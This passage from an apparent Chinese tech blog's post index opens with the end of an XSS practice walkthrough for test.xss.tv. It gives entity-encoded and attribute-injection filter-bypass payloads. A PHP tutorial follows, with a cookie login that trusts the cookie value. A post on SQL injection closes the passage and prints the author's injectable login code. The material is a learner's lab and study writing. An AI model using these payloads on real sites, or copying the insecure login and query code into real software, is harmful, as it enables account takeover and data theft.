java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116; 然后构造payload java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1) 填入输入框，点击添加友情链接然后再点友情链接，就成功了。 HTML可以识别，执行文件的正则匹配不会成功，从而达到绕过。编码绕过的方式还有好多种，比如十六进制编码、jsfuck编码、url编码等。 Level9 Javascript会被替换为javasc_rpt,尝试用html实体编码绕过，将r编码为&amp;#x72;用Level8的payload试了下，提示链接不合法，必须要有http://关键字 于是构造payload javasc&amp;#x72;ipt:%0dhttp://www.0aa.me%0dalert(1)%0a %0d都为url编码的换行符 或java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(&amp;#x22;http://\") 6.转换参数的GET型XSSLevel10 keyword注入点，&lt;、&gt;都被过滤，几乎不能突破。查看源码发现有几个type=hidden的输入框 &lt;form id=search&gt;&lt;input name=\"t_link\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"\" type=\"hidden\"&gt;&lt;/form&gt; keyword参数后面输入： &amp;t_link=” type=”text” 1&amp;t_history=” type=”text” 2&amp;t_sort =” type=”text” 3 查看注入点，发现t_sort字段可以注入(也可以一个一个的查找注入点) 。然后构造payload： &amp;t_sort=\" type=\"text\"onmouseover=alert`1` \" 或onclick触发事件 https://test.xss.tv/level10.php?t_sort=4&quot; onclick=alert(1) type=&quot;text&quot; 下面的几关好像需要抓包工具进行抓包，我还不怎么会，就暂且先总结这么多吧！后续补上下面的内容。 未完待续。。。。。。。。。。。。。。。。。。。。。。。。。。","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"BUG","slug":"BUG","permalink":"https://qwzf.gitee.io/blog/tags/BUG/"},{"name":"XSS","slug":"XSS","permalink":"https://qwzf.gitee.io/blog/tags/XSS/"}],"author":"qwzf"},{"title":"Web开发-PHP基础篇(三)","slug":"Web开发-PHP基础篇(三)","date":"2019-04-27T07:02:06.532Z","updated":"2020-01-18T12:02:50.505Z","comments":true,"path":"2019/04/27/Web开发-PHP基础篇(三)/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/04/27/Web开发-PHP基础篇(三)/","excerpt":"","text":"又继续学习了PHP的学习教程，正则表达式、日期与时间、图像处理、文件与目录操作和会话控制。感觉都十分重要，于是在学习中做了认真总结，总结如下 一、正则表达式1、正则表达式语法规则 ​ 描述了一类字符串的特征，然后通过这个特征可以配合一些特定的函数，来完成对字符串更加复杂的一系列操作！​ 普通字符和特殊字符组成的一个字符串 如： $a='/test/';$str='abctest123456a';var_dump(preg_match_all($a,$str,$b));//检查$str里是否有$a中的内容(test)，并匹配给$bvar_dump($b); 2、定界符 ​ 我们一般习惯使用正斜线/作为定界的字符。除了字母、数字和反斜线以外的字符都可以作为定界符(# ! {} |)，前后要一致 3、普通字符 a-z、A-Z、0-9、双引号、单引号，都没有特殊的含义 4、元字符 \\d 匹配任意一个十进制数字，等价于[0-9]\\D 匹配任意一个除十进制数字以外字符,等价于[^0-9]\\s 匹配任意一个空白字符,比如换页符、换行符、回车符、制表符、垂直制表符\\S 匹配除空白字符以外的任何一个字符\\w 匹配任意一个数字或字母或下划线\\W 匹配除数字、字母、下划线以外的任意一个字符. 匹配除换行符以外的任意一个字符如： $a='/te.st/';//单纯只用\".\",需要用反斜线“\\”转义$str='abcte3st123456a';var_dump(preg_match_all($a,$str,$b));var_dump($b);//输出1 * 匹配0次、或1次、或多次其前面的字符//.*配合使用默认情况下是贪婪匹配(尽可能多的去匹配字符)+ 匹配1次或多次其前面的字符? 匹配0次或1次其前面的字符//.*配合后面加个?懒惰匹配&#123;n&#125; 表示其前面字符恰好出现n次&#123;n,&#125; 表示其前面字符出现不少于n次&#123;n,m&#125; 表示其前面的字符至少出现n次，最多出现m次^或\\A 匹配字符串开始位置$或者\\Z 匹配字符串的结束位置//^与$配合使用：$a='/^test$/';| 匹配两个或多个模式//$a='/test|abc/';[] 匹配方括号中的任意一个字符//$a='/t[eabcd]st/';[^] 匹配除方括号中字符以外的任意一个字符/$a='/t[^e]st/';() 将括号中作为一个整体以便将其中的内容获取到 在我们的正则表达式中 可以使用圆括号来将某一段括起来，在圆括号的后面部分，我们可以使用 \\\\数字 来代表圆括号部分所匹配到的内容！例：$a='/t(e)st\\\\1/';//除了匹配字符串test，还匹配到了字符e。\\\\1代表第一个圆括号所匹配到的内容‘/teste/’$str=' test '; 5、模式修正符 常见模式修正符i 在和模式进行匹配时不区分大小写 例：$a=&#39;/test/i&#39;; m 多行匹配，如果目标字符串 中没有”\\n”字符, 或者模式中没有出现^或$, 设置这个修饰符不产生任何影响 使用条件： (1)目标字符串中必须包含“\\n” (2)正则表达式中必须要出现^或$ 模式修正符m的作用：多行匹配 例： $pattern='/test$/m';$str=\"test\\ntest\\n\";$pattern='/test\\r*$/m';$str=\"testtesttest\";//最后一个匹配不到，所以加*//在windows操作系统中所看到的换行(现象),其实是通过两个字符来完成的(\\r\\n)//在Linux操作系统中所看到的换行(现象),其实是通过(\\n)来完成的 s 如果设定了此修正符，那么.将匹配所有的字符包括换行符 例： $pattern='/t.st/s';$str=\"t\\st\"//可以匹配到“\\” U 禁止贪婪匹配 例： $pattern='/a.*f/U';//等价于$pattern='/a.*?f/';$str=\" adwqfsav avsfaf\"; 模式修正符是可以多个搭配使用的 6、与正则表达式配合的函数 常用： preg_match_all — 执行一个全局正则表达式匹配 参数说明： 第四个参数（可选）：PREG_PATTERN_ORDERPREG_SET_ORDERPREG_OFFSET_CAPTURE第五个参数(可选):可以传一个值,来表示从目标字符串的哪个位置开始搜索(单位是字节) $pattern='/a.*f/U';//等价于$pattern='/a.*?f/';$str=\" adwqfsav avsfaf\";var_dump(preg_match_all($pattern,$str,$arr));var_dump($arr); preg_match — 执行匹配正则表达式 匹配一次就结束，匹配不到返回0 参数说明：第一个参数:正则表达式第二个参数：目标字符串第三个参数(可选):放一个变量，执行完成之后，里面会有匹配到的部分以及等等一些数据！第四个参数(可选):可以传PREG_OFFSET_CAPTURE进入(那么第三个参数那个变量里面的数据就会有匹配到的部分的偏移值)，默认传的是0第五个参数(可选):可以传一个值,来表示从目标字符串的哪个位置开始搜索（单位是字节） $pattern='/a.*f/U';//等价于$pattern='/a.*?f/';$str=\" adwqfsav avsfaf\";var_dump(preg_match($pattern,$str,$arr,PREG_OFFSET_CAPTURE));var_dump($arr); preg_replace — 执行一个正则表达式的搜索和替换 参数说明：第一个参数：正则表达式第二个参数：要替换成的字符串第三个参数：目标字符串第四个参数(可选)：默认是-1，就是替换所有符合特征部分的！第五个参数(可选):你可以放一个变量在这边 $pattern='/&lt;div(.*?)&gt;(.*?)&lt;\\/div&gt;/';$str1='&lt;a$1 href=\"http://www.baidu.com\"&gt;$2&lt;/a&gt;';$str='dwqdwq&lt;div style=\"color:red;font-size:25px;\"&gt;测试成为绯闻绯闻绯闻绯dwqdwqdwq闻cqdwqdqw&lt;/div&gt;dqwwdqdwq&lt;div&gt;我是后面那个div&lt;/div&gt;';if(preg_match($pattern, $str,$arr))&#123; echo '替换后的：'.preg_replace($pattern, $str1, $str,-1,$count); var_dump($count);&#125;else&#123; echo '对不起，没有找到！';&#125;echo '&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;';echo '原来的字符串：'.$str; 传数组 //preg_replace第一个参数与第二个参数传数组，一一对应的去替换！$pattern=array( '/&lt;div(.*?)&gt;(.*?)&lt;\\/div&gt;/', '/&lt;p(.*?)&gt;(.*?)&lt;\\/p&gt;/');$str1=array( '&lt;a$1 href=\"http://sifangku.com\"&gt;$2&lt;/a&gt;', '&lt;span$1&gt;我是span标签啦！$2&lt;/span&gt;');$str='dwqdwq&lt;div style=\"color:red;font-size:25px;\"&gt;测试成为绯闻绯闻绯闻绯dwqdwqdwq闻cqdwqdqw&lt;/div&gt;dqwwdqdwq&lt;p&gt;我是后面那个div&lt;/p&gt;';echo '替换后的：'.preg_replace($pattern, $str1, $str,-1,$count);var_dump($count);echo '&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;';echo '原来的字符串：'.$str; 其他字符串函数： preg_filter — 执行一个正则表达式搜索和替换 preg_grep — 返回匹配模式的数组条目 preg_last_error — 返回最后一个PCRE正则执行产生的错误代码 preg_match_all — 执行一个全局正则表达式匹配 preg_match — 执行匹配正则表达式 preg_quote — 转义正则表达式字符 preg_replace_callback_array — Perform a regular expression search and replace using callbacks preg_replace_callback — 执行一个正则表达式搜索并且使用一个回调进行替换 preg_replace — 执行一个正则表达式的搜索和替换 preg_split — 通过一个正则表达式分隔字符串 二、日期与时间1、设置时区 date_default_timezone_set('Asia/Shanghai');//设置时区 2、获取当前Unix时间戳 Unix时间戳：从Unix纪元(格林威治时间1970年1月1日00时00分00秒)开始到当前的秒数 time() 3、获取指定时间的Unix时间戳 //mktime()date_default_timezone_set('Asia/Shanghai');//设置时区$nowTime=time();$time1=mktime(0,0,0,10,1,2014);//取得一个日期的 Unix 时间戳echo '距离2014年国庆还有'.(($time1-$nowTime)/60/60/24).'天'; 4、从Unix时间戳取得时间日期信息date()格式化一个本地时间／日期第一个参数:必填,写上你所需要的时间日期的格式,把format 字符放在第一个参数里面会被转换成对应的信息,其他的字符还是原来的样子 date('Y-m-d G:i:s')//Y:年 m:月 d:日 G:时 i:分 s:秒 自定义格式化Unix时间戳 为指定的时间格式。可以查询php使用手册：date()5、获取Unix时间戳和微秒数 microtime() 返回当前 Unix 时间戳和微秒数var_dump(microtime());var_dump(microtime(true));//返回一个浮点数 round()//指定精度`如：round($a,4)//四舍五入$a,保留4位小数 三、图像处理学前需要了解：在PHP中可以通过GD库处理图像(php的扩展库)创建一个图像应该完成如下所示的四个基本步骤：1.创建图像 1.创建新的 imagecreatetruecolor()//新建一个真彩色图像 2.打开服务器或网络文件中已经存在的GIF,JPEG,PNG,WBMP格式图像 imagecreatefromjpeg()imagecreatefrompng()imagecreatefromgif()imagecreatefromwbmp() 创建或者打开失败的时候会返回空字符串，并且输出一条错误信息。 imagesx()//输出画布宽度imagesy()//输出画布高度getimagesize()//取得图像大小 2.绘制图像 图像创建完成以后，就可以通过这个图像资源，使用各种画像函数设置图像的颜色、填充图像、画点、线段、以及向图像的添加文本等 1.imagecolorallocate()//分配颜色2.imagefill()//区域填充3.imagesetpixel()//画一个单一像素4.imageline()//画一条线段5.imagerectangle()//画一个矩形6.imagestring()//水平地画一行字符串7.imagettftext()//用 TrueType 字体向图像写入文本8.imagettfbbox()//计算 TrueType 文字所占区域9.imagecopy()//拷贝图像的一部分10.imagecopymerge()//拷贝并合并图像的一部分11.imagecopyresampled()//重采样拷贝部分图像并调整大小 3.输出图像 header('Content-type:image/jpeg');//输出图像为jpeg时 ​ header函数注意点​ 在该函数之前，不能输出任何内容​ 在我们的PHP代码 的函数里面，我们使用的/开头的路径 这个/不是指 web根目录,而是操作系统的 文件的根目录!4.释放资源 设计验证码的步骤： 水印 缩放与裁剪 imagecopyresampled()函数 采样某个图像资源的 某一部分 到 另外一个图像资源上面去 例1(jpeg图像)： header('Content-type:text/html;charset:utf-8');//设置编码header('Content-type:image/jpeg');//输出图像为jpeg时$img=imagecreatetruecolor(200,100);//新建一个宽200高100的真彩色图像$color1=imagecolorallocate($img,20,40,255);//分配颜色,采用RGB格式$color2=imagecolorallocate($img,70,80,90);imagefill($img,0,0,$color1);//区域填充,从左上角0，0处进行填充imagejpeg($img);//输出图像为jpeg格式/*if(imagejpeg($img,'1.jpeg'))&#123; echo '保存成功';&#125;//加参数是保存图像,可以写相对路径*/imagecopyresampled($img);//释放资源 例2(验证码)： header('Content-type:text/html;charset:utf-8');//设置编码header('Content-type:image/jpeg');//输出图像为jpeg时$width=120;//图像宽$height=40;//图像高$element=array('a','b','c','d','e','f','g','h','i','j','k','m','n','o','p','q','r','s','t','u','v','w','x','y','z');//字符串所包含字符$string='';//初始化字符for ($i=0;$i&lt;5;$i++)&#123;//字符串字符个数 $string.=$element[rand(0,count($element)-1)];//每次在$element随机选择字符并赋给$string&#125;$img=imagecreatetruecolor($width, $height);//创建图像$colorBg=imagecolorallocate($img,rand(200,255),rand(200,255),rand(200,255));//背景颜色，RGB格式，且RGB在200到255随机$colorBorder=imagecolorallocate($img,rand(200,255),rand(200,255),rand(200,255));//边框颜色，RGB格式，且RGB在200到255随机$colorString=imagecolorallocate($img,rand(10,100),rand(10,100),rand(10,100));//字符串颜色，RGB格式，且RGB在10到100随机imagefill($img,0,0,$colorBg);//区域填充imagerectangle($img,0,0,$width-1,$height-1,$colorBorder);//画一个宽为119，高为39的矩形。并显示边框颜色for($i=0;$i&lt;100;$i++)&#123;//画了100个点，并在矩形里随机分布。点的颜色，RGB格式，且RGB在100到200随机 imagesetpixel($img,rand(0,$width-1),rand(0,$height-1),imagecolorallocate($img,rand(100,200),rand(100,200),rand(100,200)));&#125;for($i=0;$i&lt;3;$i++)&#123;//画了3条线 imageline($img,rand(0,$width/2),rand(0,$height),rand($width/2,$width),rand(0,$height),imagecolorallocate($img,rand(100,200),rand(100,200),rand(100,200)));&#125;//imagestring($img,5,0,0,'abcd',$colorString);//不太常用，一般用下面这种方式imagettftext($img,19,rand(-5,5),rand(5,15),rand(30,35),$colorString,'font/Inkfree.ttf',$string);//19是字体大小 rand(-5,5)是偏转角度从-5到5的随机角度 rand(5,15)和rand(30,35)是宽和高的范围 $colorString是字体颜色 'font/Inkfree.ttf'是使用字体样式的路径 $string是字符串imagejpeg($img);//输出图像imagedestroy($img);//释放资源 例3(文字水印)： header('Content-type:text/html;charset:utf-8');//设置编码header('Content-type:image/jpeg');//输出图像为jpeg时$img=imagecreatefromjpeg('images/1.jpg');//打开images文件下的1.jpg图片(也可以打开浏览器上的图片，写图片地址)$color=imagecolorallocate($img,255,255,255);//颜色$width=imagesx($img);//取得图像宽度$height=imagesy($img);//取得图像高度$position=imagettfbbox(20,0,'font/Inkfree.TTF','qwzf');$stringWidth=$position[2]-$position[0];//水印宽度imagettftext($img,20,0,$width-1-$stringWidth-($width/30),$height-1-($height/30), $color,'font/Inkfree.TTF','qwzf');//$width-1-$stringWidth-($width/30),$height-1-($height/30)把水印放在右下角imagejpeg($img);//输出图像imagedestroy($img);//释放资源 例4(图片水印)： header('Content-type:image/jpeg');$img=imagecreatefromjpeg('images/zcx.jpg');$waterMark=imagecreatefromgif('images/watermark.gif');$color=imagecolorallocate($img,255,255,255);$width=imagesx($img);$height=imagesy($img);$waterMarkWidth=imagesx($waterMark);$waterMarkHeight=imagesy($waterMark);$position=imagettfbbox(20,0,'font/Inkfree.TTF','qwzf');$stringWidth=$position[2]-$position[0];//文字水印//imagettftext($img,20,0,$width-1-$stringWidth-($width/30),$height-1-($height/30), $color,'font/china1.TTF','小刚/周传雄');/*imagecopy($img,$waterMark,100,100,0,0,$waterMarkWidth,$waterMarkHeight);参数说明：$img:目标图像资源$waterMark:水印的图像资源100:所要拷贝到目标图像资源上面的坐标(x轴位置)100:所要拷贝到目标图像资源上面的坐标(y轴位置)0:从水印的图像资源的x坐标为0的位置开始拷贝0:从水印的图像资源的y坐标为0的位置开始拷贝$waterMarkWidth:所要拷贝的水印图像的长度$waterMarkHeight:所要拷贝的水印图像的高度*/imagecopy($img,$waterMark,$width-1-$waterMarkWidth,$height-1-$waterMarkHeight,0,0,$waterMarkWidth,$waterMarkHeight);imagejpeg($img);imagedestroy($img); 例4(裁剪和收缩)： //等比例缩放(裁剪)header('Content-type:image/jpeg');$img=imagecreatefromjpeg('images/zcx.jpg');$imgWidth=imagesx($img);$imgHeight=imagesy($img);$height=$width/($imgWidth/$imgHeight);$img1=imagecreatetruecolor($width,$height);/*imagecopyresampled($dst_image, $src_image, $dst_x, $dst_y, $src_x, $src_y, $dst_w, $dst_h, $src_w, $src_h)参数说明：$dst_image:目标图像资源$src_image:源图像资源（你要采样的那个图像资源）$dst_x:$dst_y:与上面的$dst_x确定了一个坐标,把采样到的部分 放到目标图像资源的什么位置$src_x:$src_y:与上面的$src_y确定了一个坐标,你要采样的原图像资源的 某个部分的起始坐标$dst_w:$dst_h:与上面的$dst_w确定了 放到目标图像资源上面的尺寸$src_w:$src_h:与上面的$src_w确定了 采样原图像资源的 某个部分*/imagecopyresampled($img1,$img,0,0,0,0,$width,$height,$imgWidth,$imgHeight);//裁剪//imagecopyresampled($img1,$img,0,0,0,0,100,100,100,100);if(imagejpeg($img1))&#123; imagejpeg($img1,'images/zoom_zcx.jpg');&#125;imagedestroy($img);imagedestroy($img1); 五、文件与目录操作任何数据类型变量所存储的数据，都是在程序运行时才加载到内存中，而不能持久保存，那么如果需要将数据长久的保存起来，主要有两种办法，保存到普通文件中或者保存到数据库中。PHP可以在服务器上生成目录，创建、编辑、删除、修改文件属性等操作 1、判断普通文件和目录 1.is_file()//判断给定文件名是否为一个正常的文件(如：文件)2.is_dir()//判断给定文件名是否是一个目录(如：文件夹) 2、文件的属性 1.file_exists()//检查文件或目录是否存在2.filesize()//取得普通文件大小(字节)3.is_readable()//判断给定文件名是否可读4.is_writable()//判断给定的文件名是否可写5.filectime()//获取文件的创建时间6.filemtime()//获取文件的修改时间7.fileatime()//取得文件的上次访问时间8.stat()//获取文件大部分属性值 3、目录的基本操作 1.basename()//返回路径中的文件名部分2.dirname()//返回路径中的目录部分3.pathinfo()//返回文件路径的信息4.opendir()//打开目录句柄5.readdir()//从目录句柄中读取条目,返回目录中下一个文件的文件名6.rewinddir()//倒回目录句柄7.closedir()//关闭目录句柄8.mkdir()//新建目录9.rmdir()//删除指定的空目录10.scandir()//列出指定路径中的文件和目录 4、文件的基本操作 1.fopen()//打开文件或者 URL r只读 r+读写2.fread()//读取文件3.fgets()//从文件指针中读取一行4.feof()//测试文件指针是否到了文件结束的位置5.fwrite()//写入文件，返回写入的字节数6.rewind()//倒回文件指针的位置7.flock()//轻便的咨询文件锁定8.ftruncate()//将文件截断到给定的长度9.fclose()//关闭一个已打开的文件指针10.file() //把整个文件读入一个数组中11.copy()//拷贝文件12.unlink()//删除文件13.file_get_contents()//将整个文件读入一个字符串14.file_put_contents()//将字符串写入文件中15.rename()//重命名一个文件或目录16.readfile()//读入一个文件并写入到输出缓冲 例： $file=fopen('1.txt','r');//打开1.txt文件，只读var_dump(fread($file,2));//读取两个字节var_dump(fgets($file));//读一行 5、文件的上传文件的上传的过程这些细节是不需要管的，都是自动的，上传的文件默认是放在一个临时的目录里面的，我们要做的就是把这些临时目录里面的文件移动到我们需要的地方 1.html标签需要做的上传设置 (1) form标签属性设置 ​ method设置为post ​ enctype设置为multipart/form-data ​ form表单中设置隐藏类型的input,其中name值设置为MAX_FILE_SIZE,VALUE值设置为需要限制的上传文件的大小(单位为字节) 2.在服务器端通过PHP处理上传文件，涉及到下面的几条信息 (1)与上传有关的 php配置选项(php.ini) ​ 配置项 可能值 功能描述file_uploads ON 确定服务器上的PHP脚本是否可以接受HTTP文件上传memory_limit 8M 设置脚本可以分配的最大内存量，防止失控的脚本独占服务器内存upload_max_filesize 2M 限制PHP处理上传文件的最大值，此值必须小于post_max_size值post_max_size 8M 限制通过POST方法可以接受的信息最大量upload_tmp_dir F:/wamp/tmp 上传文件存放的临时路径，可以是一个绝对路径。这个目录对于拥有此服务器进程用户必须是可写的。 (2)$_FILES多维数组：用于存储各种与上传有关的信息 ​ $_FILES[‘file’][‘name’] 客户端机器文件的原名称，包含扩展名 ​ $_FILES[‘file’][‘size’] 已上传文件的大小，单位为字节 ​ $_FILES[‘file’][‘tmp_name’] 文件上传之后，在服务器端存储的临时文件名 ​ $_FILES[‘file’][‘error’] 文件上传时产生的错误 ​ 0：表示没有发生任何错误，文件上传成功 ​ 1：表示上传文件的大小超出了再PHP配置文件中upload_max_filesize选项限制的值 ​ 2：表示上传文件大小超出了HTML表单中MAX_FILE_SIZE选项所指定的值 ​ 3：表示文件只被部分上传 ​ 4：表示没有上传任何文件 ​ $_FILES[‘file’][‘type’] 获取客户端上传文件的MIME类型，MIME类型规定了各种文件格式的类型。每种MIME类型都是由/分隔的主类型和子类型组成 (3)PHP的文件上传处理函数：用于上传文件的后续处理 ​ is_uploaded_file()判断指定的文件是否通过HTTP POST上传的 ​ move_uploaded_file()文件上传后，首先会存储于服务器的临时目录中，可以使用该函数将上传的文件移动到新位置 6、文件的下载 (1)发送指定的文件MIME类型的头信息 header('Content-type:MIME类型'); (2)指定下载文件的描述 header('Content-Disposition:attachement;filename=文件名称'); (3)指定下载文件的大小 header('Content-Length:文件大小'); (4)读取文件内容至输出缓冲区 readfile(); ​ 获取文件的MIME类型：http://localhost/php/index.php就相当于：localhost/php/a.rar 六、会话控制1、cookie的设置、读取与删除 客户端电脑中设置 header('Content-type:text/html;charset=utf-8');var_dump(setcookie('username','password',time()+3600));//var_dump(setcookie('member[username]','password',time()+3600));//将多维数组应用于Cookie中 服务器端上读取 var_dump($_COOKIE);//超全局变量，在服务器端上读取Cookie的内容 删除 header('Content-type:text/html;charset=utf-8');var_dump(setcookie('username','',time()-1));//删除Cookie/*foreach($_COOKIE['member'] as $key=&gt;$val)&#123;//遍历数组删除cookie var_dump(setcookie('member[&#123;$key&#125;]','',time()-3600));&#125;*/ 注意：使用setcookie删除cookie的时候，需要与当初设置cookie的时候参数一致 2、session的开启、存储与销毁 返回一个分配好的session id 把这个id保存在客户端的cookie里面 id对应的数据都是保存在服务器端 开启 session_start(); (1)开启一个会话(2)打开已经存在的会话 根据客户端传来的session id 把这个 session id 对应的数据 读取到$_SESSION这个变量里面 存储 header('Content-type:text/html;charset=utf-8');session_start();$_SESSION['name']='qwzf';$_SESSION['email']='1739381035@qq.com'; 读取 header('Content-type:text/html;charset=utf-8');session_start();//开启会话var_dump($_SESSION);//接收服务器端返回的数据，并输出//var_dump($_COOKIE);//输出cookie//var_dump(session_name());//session_name()获取cookie名称 销毁 session_start();//打开要销毁的会话session_unset();//Free all session variables销毁变量session_destroy();//销毁一个会话中的全部数据setcookie(session_name(),'',time()-3600,'/');//销毁保存在客户端的session id //“/”Web根目录 3、基于cookie或session的登录模块 COOKIE login.php的源代码 &lt;?php header('Content-type:text/html;charset=utf-8');if (isset($_COOKIE['username']) &amp;&amp; $_COOKIE['username']==='admin') &#123; exit('您已经登录请不要重复登录');&#125;if(isset($_POST['submit']))&#123; if(isset($_POST['username']) &amp;&amp; isset($_POST['password']) &amp;&amp; $_POST['username']==='admin' &amp;&amp; $_POST['password']==='admin')&#123; if(setcookie('username',$_POST['username'],time()+3600))&#123; header('Location:index.php'); &#125;else&#123; echo 'cookie设置失败！'; &#125; &#125;else&#123; echo \"您的用户名或密码输入有误，&lt;a href=login.php&gt;请重新登录！&lt;/a&gt;\"; &#125;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=\"zh-CN\"&gt;&lt;head&gt;&lt;meta charset=\"utf-8\" /&gt;&lt;title&gt;请登录&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=\"post\" action=\"login.php\"&gt; 用户名：&lt;input type=\"text\" name=\"username\" /&gt;&lt;br /&gt; 密码：&lt;input type=\"password\" name=\"password\" /&gt; &lt;input type=\"submit\" name=\"submit\" value=\"登录\" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; index.php的源代码 &lt;?php header('Content-type:text/html;charset=utf-8');if (isset($_COOKIE['username']) &amp;&amp; $_COOKIE['username']==='admin') &#123; echo \"&#123;$_COOKIE['username']&#125;您好,欢迎回来！\"; echo \"&lt;a href='logout.php'&gt;注销&lt;/a&gt;\";&#125;else &#123; echo \"&lt;a href='login.php'&gt;请登录&lt;/a&gt;\";&#125;?&gt; logout.php的源代码 &lt;?php header('Content-type:text/html;charset=utf-8');if (isset($_COOKIE['username']) &amp;&amp; $_COOKIE['username']==='admin') &#123; if(setcookie('username',$_POST['username'],time()-3600))&#123; header('Location:login.html'); &#125;else&#123; echo \"&lt;script type='text/javascript'&gt;alert('注销失败');location='index.php';&lt;/script&gt;\"; &#125;&#125;?&gt; SESSION login.php的源代码 &lt;?php session_start();header('Content-type:text/html;charset=utf-8');if (isset($_SESSION['username']) &amp;&amp; $_SESSION['username']==='admin') &#123; exit('您已经登录请不要重复登录');&#125;if(isset($_POST['submit']))&#123; if(isset($_POST['username']) &amp;&amp; isset($_POST['password']) &amp;&amp; $_POST['username']==='admin' &amp;&amp; $_POST['password']==='admin')&#123; $_SESSION['username']=$_POST['username']; header('Location:index.php'); &#125;else&#123; echo \"您的用户名或密码输入有误，&lt;a href=login.php&gt;请重新登录！&lt;/a&gt;\"; &#125;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=\"zh-CN\"&gt;&lt;head&gt;&lt;meta charset=\"utf-8\" /&gt;&lt;title&gt;请登录&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=\"post\" action=\"login.php\"&gt; 姓名：&lt;input type=\"text\" name=\"username\" /&gt; 密码：&lt;input type=\"password\" name=\"password\" /&gt; &lt;input type=\"submit\" name=\"submit\" value=\"登录\" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; index.php的源代码 &lt;?php session_start();header('Content-type:text/html;charset=utf-8');if (isset($_SESSION['username']) &amp;&amp; $_SESSION['username']==='admin') &#123; echo \"&#123;$_SESSION['username']&#125;您好,欢迎回来！\"; echo \"&lt;a href='logout.php'&gt;注销&lt;/a&gt;\";&#125;else &#123; echo \"&lt;a href='login.php'&gt;请登录&lt;/a&gt;\";&#125;?&gt; logout.php的源代码 &lt;?php session_start();header('Content-type:text/html;charset=utf-8');if (isset($_SESSION['username']) &amp;&amp; $_SESSION['username']==='admin') &#123; session_unset();//Free all session variables销毁变量 session_destroy();//销毁一个会话中的全部数据 setcookie(session_name(),'',time()-3600,'/');//销毁保存在客户端的session id header('Location:login.html');&#125;else&#123; echo \"&lt;script type='text/javascript'&gt;alert('注销失败');location='index.php';&lt;/script&gt;\"; &#125;?&gt; 总结完毕，总结练习过程中收获是巨多的。一起继续努力吧！小白进阶ing","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/tags/Web/"},{"name":"开发","slug":"开发","permalink":"https://qwzf.gitee.io/blog/tags/开发/"},{"name":"PHP","slug":"PHP","permalink":"https://qwzf.gitee.io/blog/tags/PHP/"}],"author":"qwzf"},{"title":"一次团队内部比赛经历","slug":"一次团队内部比赛经历","date":"2019-04-26T14:59:01.437Z","updated":"2019-08-01T05:12:20.491Z","comments":true,"path":"2019/04/26/一次团队内部比赛经历/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/04/26/一次团队内部比赛经历/","excerpt":"","text":"经过这次登录框被多数人打爆的经历，我反思了很多。由于当时为了快点写好登录框，没有考虑对登录框的SQL注入进行预防。在写登录框制作总结时，也发现了自己登录框存在的漏洞，但是没有去改。。。最终导致这一惨剧的发生！！！ 经过不断的修改，最终把我已知漏洞修复完毕。在这个过程中，我收获了很多，所以总结了一下。。 SQL注入介绍所谓SQL注入式攻击，就是输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。在某些表单中，用户输入的内容直接用来构造(或者影响)动态SQL命令(也就是所谓构造payload)，或作为存储过程的输入参数，这类表单特别容易受到SQL注入式攻击 SQL注入发生当应用程序使用输入内容来构造payload以访问数据库时，会发生sql注入攻击。 如果代码使用存储过程，而这些存储过程作为包含未筛选的用户输入的 字符串来传递，也会发生sql注入。 sql注入可能导致攻击者使用应用程序登陆在数据库中执行命令。如果应用程序使用特权过高的帐户连接到数据库，这种问题会变得很严重。在某些表单中，用户输入的内容直接用来构造payload，或者作为存储过程的输入参数，这些表单特别容易受到sql注入的攻击。而许多 网站程序在编写时，没有对用户输入的合法性进行判断或者程序中本身的变量处理不当，使应用程序存在安全隐患。这样，用户就可以提交一段数据库查询的代码， 根据程序返回的结果，获得一些敏感的信息或者控制整个服务器，于是sql注入就发生了。 SQL注入的预防思路1.永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和双”-“进行转换等。 2.永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。 3.永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。 4.不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。 5.应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装 6.sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具jsky,网站平台就有亿思网站安全平台检测工具 正文SQL注入漏洞首先，先看一下我的登录验证的源代码 &lt;?phpheader('Content-type:text/html;charset=utf-8');$db = mysql_connect(\"localhost\",\"root\",\"root\")//mysql_connect()建立数据库连接//localhost:连接MySQL地址//root:连接MySQL用户名//root:连接MySQL密码 or die(\"连接数据库失败！\"); mysql_select_db(\"demo\",$db)//mysql_select_db()选择数据库，这里选择的是数据库名为demo的数据库 or die(\"您要选择的数据库不存在\".mysql_error());$username=$_POST['username'];//用$username存放从login.html表单提交过来的username$password=$_POST['password'];//用$password存放从login.html表单提交过来的password$sql=\"select * from users where username='$username' and password='$password'\";/*用$sql存放sql查询判断命令*/$result = mysql_query($sql);//mysql_query()规定要发送的SQL查询，查询MySQL，存放于$result。注意：查询字符串不应以分号结束$colum= mysql_fetch_array($result);//mysql_fetch_array()获取和显示数据if(is_array($colum))&#123;//is_array()检测变量是否是数组 if(setcookie('username',$_POST['username'],time()+3600))&#123;//设置cookie header(\"Location:index.php\"); &#125; else&#123; echo 'Cookie设置失败'; &#125;&#125;else&#123; echo 